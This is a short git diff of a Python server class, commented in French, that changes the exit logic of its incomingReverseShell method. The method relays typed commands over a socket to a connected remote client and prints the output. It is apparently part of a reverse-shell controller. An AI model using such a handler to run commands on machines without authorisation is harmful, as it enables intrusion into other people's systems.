@@ -46,9 +46,10 @@ class Server():
 
     def incomingReverseShell(self, c):
 
-        # Premier receive donne le current working directory
+        quitting = False
+        # Reçoit le premier message et initialise data["cwd"]
         data = self.decode(c)
-        while True:
+        while not quitting:
 
             data["command"] = input(f"{data['cwd']} $> ")
             if not data["command"].strip():
@@ -58,12 +59,12 @@ class Server():
                 continue
             else:
                 c.send(self.encode(data))
-                # c.send(bytes(command, "UTF-8"))
                 data = self.decode(c)
             
             if data["command"].lower() == "exit":
+                quitting = True
                 c.close()
-                break
+                continue
         
             print(data["output"])
 
